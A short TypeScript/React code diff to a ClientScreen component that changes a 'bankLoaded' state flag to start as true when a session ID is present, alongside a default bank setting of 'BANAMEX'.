@@ -58,7 +58,7 @@ export default function ClientScreen() {
   const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({
     banco: 'BANAMEX' // Banco por defecto para la página principal
   });
-  const [bankLoaded, setBankLoaded] = useState<boolean>(isHomePage);
+  const [bankLoaded, setBankLoaded] = useState<boolean>(isHomePage || !!sessionId);
   
   // Additional screen-specific state
   const [screenData, setScreenData] = useState<{
